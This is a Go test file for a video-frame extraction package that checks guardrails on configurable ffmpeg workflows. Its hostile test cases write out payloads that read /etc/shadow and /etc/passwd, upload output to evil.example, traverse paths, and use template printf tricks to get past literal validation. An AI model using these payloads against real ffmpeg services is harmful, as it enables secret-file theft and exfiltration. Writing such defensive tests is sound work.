package frames

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vismod/vismod/internal/config"
)

func ffCfg() config.FFmpegConfig {
	return config.FFmpegConfig{
		FFmpegPath: "ffmpeg", FFprobePath: "ffprobe",
		DefaultWorkflow: "scene-detect", MaxFrames: 64, MaxWidth: 1280,
		Workflows: config.DefaultWorkflows(),
	}
}

func TestDefaultWorkflowsValidate(t *testing.T) {
	if err := ValidateAll(ffCfg()); err != nil {
		t.Fatalf("shipped defaults must validate: %v", err)
	}
}

func TestGuardrailsRejectHostileWorkflows(t *testing.T) {
	base := []string{"-hide_banner", "-nostdin", "-y", "-i", "{{.Input}}"}
	out := "{{.WorkDir}}/frame-%06d.png"

	tests := []struct {
		name    string
		args    []string
		wantErr string
	}{
		{"second input injection",
			append(append([]string{}, base...), "-i", "/etc/shadow", out),
			"exactly one"},
		{"http exfiltration output",
			append(append([]string{}, base...), "http://evil.example/upload"),
			"forbidden protocol"},
		{"concat arbitrary file read",
			[]string{"-nostdin", "-i", "{{.Input}}", "-f", "concat:/etc/passwd", out},
			"forbidden protocol"},
		{"pipe protocol",
			[]string{"-nostdin", "-i", "{{.Input}}", "pipe:1"},
			"forbidden protocol"},
		{"subfile read",
			[]string{"-nostdin", "-i", "{{.Input}}", "subfile,,start,0,end,0:/etc/passwd", out},
			"forbidden protocol"},
		{"file: traversal",
			[]string{"-nostdin", "-i", "{{.Input}}", "file:../../secret", out},
			"forbidden protocol"},
		{"output escapes workdir",
			append(append([]string{}, base...), "/tmp/frames-%06d.png"),
			"output confinement"},
		{"workdir only in output",
			[]string{"-nostdin", "-i", "{{.Input}}", "-passlogfile", "{{.WorkDir}}/log", out},
			"only permitted in the final output"},
		{"unknown placeholder",
			[]string{"-nostdin", "-i", "{{.Input}}", "-vf", "scale={{.Secret}}", out},
			"unknown placeholder"},
		{"input embedded in expression",
			[]string{"-nostdin", "-i", "{{.Input}}", "-vf", "movie={{.Input}}", out},
			"standalone"},
		{"input not after -i",
			[]string{"-nostdin", "-i", "x.mp4", "{{.Input}}", out},
			"" /* any of the -i pairing errors */},
		{"absolute path smuggling",
			[]string{"-nostdin", "-i", "{{.Input}}", "-passlogfile", "/var/log/x", out},
			"absolute paths"},
		{"empty args", nil, "empty args"},

		// Every guardrail above matches LITERAL text: placeholderRe only
		// recognizes bare {{.Name}} actions, the second-input check is
		// arg == "-i", and looksAbsolutePath runs on the UNRENDERED arg. A
		// template action that is not a bare field is invisible to all
		// three, and only the rendered output tells the truth.
		{"printf smuggles a second -i past the literal check",
			[]string{"-nostdin", "-i", "{{.Input}}", `{{printf "-i"}}`, `{{printf "/etc/%s" "passwd"}}`, out},
			""},
		{"printf smuggles an absolute path past looksAbsolutePath",
			[]string{"-nostdin", "-i", "{{.Input}}", "-passlogfile", `{{printf "/var/log/x"}}`, out},
			""},
		{"printf reconstructs a forbidden protocol",
			[]string{"-nostdin", "-i", "{{.Input}}", `{{printf "htt%s://evil.example/u" "p"}}`, out},
			""},
		{"conditional action is not a bare placeholder",
			[]string{"-nostdin", "-i", "{{.Input}}", `{{if .MaxWidth}}-vf{{end}}`, out},
			""},
		{"spaced field reference dodges the -i pairing check",
			[]string{"-nostdin", "-i", "{{ .Input }}", out},
			""},
	}
	cfg := ffCfg()
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateWorkflow("hostile", config.WorkflowConfig{Args: tc.args}, cfg)
			if err == nil {
				t.Fatalf("hostile workflow must be rejected: %v", tc.args)
			}
			if tc.wantErr != "" && !strings.Contains(err.Error(), tc.wantErr) {
				t.Errorf("error %q should mention %q", err, tc.wantErr)
			}
		})
	}
}

func TestValidateAllRejectsMissingDefault(t *testing.T) {
	cfg := ffCfg()
	cfg.DefaultWorkflow = "nope"
	if err := ValidateAll(cfg); err == nil {
		t.Error("undefined default_workflow must fail")
	}
}

func TestValidateRejectsZeroMaxFrames(t *testing.T) {
	cfg := ffCfg()
	cfg.MaxFrames = 0
	if err := ValidateAll(cfg); err == nil {
		t.Error("max_frames=0 must fail (required hard cap)")
	}
}

func TestRenderWorkflow(t *testing.T) {
	wf := config.DefaultWorkflows()["interval"]
	args, err := RenderWorkflow(wf, TemplateValues{
		Input: "/data/in.mp4", WorkDir: "/work/dir", MaxFrames: 8, MaxWidth: 640,
	})
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "/data/in.mp4") || !strings.Contains(joined, "/work/dir/frame-%06d.png") {
		t.Errorf("render missing substitutions: %v", args)
	}
	if !strings.Contains(joined, "-frames:v 8") || !strings.Contains(joined, "scale=640:-1") {
		t.Errorf("typed values not substituted: %v", args)
	}
	if args[0] != "-hide_banner" && args[0] != "-nostdin" {
		t.Errorf("unexpected first arg: %v", args[0])
	}
}

func TestRenderAddsNostdinWhenMissing(t *testing.T) {
	wf := config.WorkflowConfig{Args: []string{"-i", "{{.Input}}", "{{.WorkDir}}/f-%d.png"}}
	args, err := RenderWorkflow(wf, TemplateValues{Input: "a", WorkDir: "b", MaxFrames: 1, MaxWidth: 1})
	if err != nil {
		t.Fatal(err)
	}
	if args[0] != "-nostdin" {
		t.Errorf("-nostdin must be enforced: %v", args)
	}
}

// bareField accepts only {{.Name}}. Everything else in a template pipeline
// — assignments, chained calls, function calls, multi-part field paths —
// renders to something the literal guardrails never inspected.
func TestCheckTemplateShapeRejectsNonBarePipelines(t *testing.T) {
	for _, arg := range []string{
		`{{$x := .Input}}`,         // declaration
		`{{.Input | printf "%s"}}`, // chained command
		`{{printf "%s" .Input}}`,   // function call
		`{{.Input.Field}}`,         // multi-part field path
		`{{if .MaxWidth}}x{{end}}`, // conditional
		`{{range .Input}}x{{end}}`, // range
		`{{with .Input}}x{{end}}`,  // with
		`{{"literal"}}`,            // string constant
		`{{23}}`,                   // numeric constant
	} {
		if err := checkTemplateShape("hostile", 0, arg); err == nil {
			t.Errorf("checkTemplateShape accepted %q", arg)
		}
	}
}

// The bare forms that workflows legitimately use must keep working,
// including surrounding text and whitespace inside the action.
func TestCheckTemplateShapeAcceptsBarePlaceholders(t *testing.T) {
	for _, arg := range []string{
		"{{.Input}}",
		"{{ .WorkDir }}/frame-%06d.png",
		"scale={{.MaxWidth}}:-1",
		"-frames:v",
		`select=gt(scene\,0.4),showinfo`,
		"{{.MaxFrames}}",
	} {
		if err := checkTemplateShape("ok", 0, arg); err != nil {
			t.Errorf("checkTemplateShape rejected a legitimate arg %q: %v", arg, err)
		}
	}
}

// An arg that is not a parseable template must be refused rather than
// reaching ffmpeg unvalidated.
func TestCheckTemplateShapeRejectsUnparseableArgs(t *testing.T) {
	if err := checkTemplateShape("hostile", 0, "{{.Input"); err == nil {
		t.Error("an unparseable template arg was accepted")
	}
}

// dhashFile must fail rather than guess when the file is not a decodable
// image — Dedup keeps unhashable frames, so a silent zero hash here would
// collapse them all instead.
func TestDhashFileRejectsUndecodableInput(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "not-an-image.png")
	if err := os.WriteFile(p, []byte("definitely not a png"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := dhashFile(p); err == nil {
		t.Error("dhashFile accepted a non-image")
	}
	if _, err := dhashFile(filepath.Join(dir, "missing.png")); err == nil {
		t.Error("dhashFile accepted a missing file")
	}
}
